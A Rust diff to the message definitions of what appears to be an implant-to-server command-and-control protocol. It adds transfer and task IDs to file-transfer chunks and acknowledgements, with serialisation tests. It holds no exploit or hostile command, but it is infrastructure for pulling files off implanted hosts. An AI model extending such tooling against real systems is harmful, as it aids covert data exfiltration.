@@ -98,6 +98,13 @@ pub struct PollReply {
 /// One chunk of a file streaming from the implant to the server.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct FileChunk {
+    /// Durable server-generated transfer identity. Absent only when decoding
+    /// legacy peers; current transfer handlers reject a missing value.
+    #[serde(default)]
+    pub transfer_id: Option<Uuid>,
+    /// Task that authorized this transfer. Absent only for legacy decoding.
+    #[serde(default)]
+    pub task_id: Option<Uuid>,
     /// Remote basename — the server's storage key for the transfer.
     pub name: String,
     /// Absolute byte offset of this chunk in the file.
@@ -111,6 +118,9 @@ pub struct FileChunk {
 /// Server -> implant progress on the active file transfer.
 #[derive(Debug, Clone, Copy, Serialize, Deserialize)]
 pub struct FileAck {
+    /// Transfer whose contiguous offset is acknowledged.
+    #[serde(default)]
+    pub transfer_id: Option<Uuid>,
     /// Highest contiguous byte offset the server has persisted for this file.
     pub received: u64,
     /// Total bytes the server expects (echoed from FileChunk.total).
@@ -172,5 +182,44 @@ mod tests {
         let reply: PollReply =
             serde_json::from_str(r#"{"tasks":[],"acks":[],"push_chunks":[]}"#).unwrap();
         assert!(reply.result_acks.is_empty());
+    }
+
+    #[test]
+    fn file_transfer_messages_round_trip_transfer_and_task_ids() {
+        let transfer_id = Uuid::new_v4();
+        let task_id = Uuid::new_v4();
+        let chunk = FileChunk {
+            transfer_id: Some(transfer_id),
+            task_id: Some(task_id),
+            name: "/srv/lab/artifact.bin".into(),
+            offset: 1024,
+            total: 3072,
+            data: vec![7; 16],
+        };
+        let decoded: FileChunk =
+            serde_json::from_slice(&serde_json::to_vec(&chunk).unwrap()).unwrap();
+        assert_eq!(decoded.transfer_id, Some(transfer_id));
+        assert_eq!(decoded.task_id, Some(task_id));
+
+        let ack = FileAck {
+            transfer_id: Some(transfer_id),
+            received: 1040,
+            total: 3072,
+            done: false,
+        };
+        let decoded: FileAck = serde_json::from_slice(&serde_json::to_vec(&ack).unwrap()).unwrap();
+        assert_eq!(decoded.transfer_id, Some(transfer_id));
+    }
+
+    #[test]
+    fn legacy_file_transfer_messages_default_protocol_ids_to_none() {
+        let chunk: FileChunk =
+            serde_json::from_str(r#"{"name":"artifact.bin","offset":0,"total":3,"data":[1,2,3]}"#)
+                .unwrap();
+        assert_eq!(chunk.transfer_id, None);
+        assert_eq!(chunk.task_id, None);
+
+        let ack: FileAck = serde_json::from_str(r#"{"received":3,"total":3,"done":true}"#).unwrap();
+        assert_eq!(ack.transfer_id, None);
     }
 }
